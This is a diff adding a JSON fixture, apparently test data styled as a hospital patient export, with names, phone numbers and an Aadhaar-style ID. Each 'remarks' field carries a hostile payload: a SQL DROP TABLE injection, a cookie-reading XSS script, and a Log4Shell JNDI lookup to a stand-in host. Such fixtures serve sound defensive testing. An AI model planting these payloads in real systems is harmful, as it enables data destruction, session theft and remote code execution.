@@ -1,0 +1,26 @@
+{
+  "source": "KVH HIS 2019 export",
+  "rows": [
+    {
+      "reg_year": 2019,
+      "remarks": "'; DROP TABLE patients;--",
+      "name": "Saroj Hegde",
+      "aadhaar": "8964 5522 1224",
+      "mobile": "6165063509"
+    },
+    {
+      "reg_year": 2019,
+      "remarks": "<script>alert(document.cookie)</script>",
+      "name": "Omkar D'Mello",
+      "mobile": 6235542097.0,
+      "reg_no": "kvh/op/25-426424"
+    },
+    {
+      "reg_year": 2019,
+      "remarks": "${jndi:ldap://evil.invalid/a}",
+      "name": "Subhendu Bora",
+      "mobile": 7441631772.0,
+      "reg_no": "kvh/op/25-088085"
+    }
+  ]
+}
